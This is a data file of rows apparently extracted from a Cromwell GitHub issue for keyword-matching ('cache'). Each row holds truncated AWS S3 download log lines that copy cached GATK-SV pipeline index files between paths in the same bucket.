Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz.tbi; 1608597364585,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz.tbi; 1608597367102,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz; 1608597369233,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:116011,cache,cacheCopy,116011,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz.tbi; 1608597089027,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz.tbi; 1608597091077,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz.tbi; 1608597093130,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:41852,cache,cacheCopy,41852,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz.tbi; 1608597198607,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi; 1608597201756,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz; 1608597204085,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:71750,cache,cacheCopy,71750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz.tbi; 1608597531104,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz.tbi; 1608597532744,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz.tbi; 1608597533973,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerg",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:164890,cache,cacheCopy,164890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz.tbi; 1608597259619,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz.tbi; 1608597261055,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz.tbi; 1608597263910,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:87962,cache,cacheCopy,87962,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz.tbi; 1608597406434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi; 1608597409505,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz; 1608597411470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:127874,cache,cacheCopy,127874,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi; 1608597517316,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi; 1608597520303,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz; 1608597523198,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:161145,cache,cacheCopy,161145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz.tbi; 1608597303071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi; 1608597306259,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz; 1608597308537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:99805,cache,cacheCopy,99805,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz.tbi; 1608597118429,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz.tbi; 1608597120193,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz.tbi; 1608597122029,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:49951,cache,cacheCopy,49951,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz.tbi; 1608597536250,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz.tbi; 1608597538865,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz.tbi; 1608597540849,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerg",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:166775,cache,cacheCopy,166775,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"6c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz.tbi; 1608597213995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-38/cacheCopy/SR00c.HG01799.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-38/cacheCopy/SR00c.HG01799.txt.gz.tbi; 1608597216321,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz; 1608597218252,download: 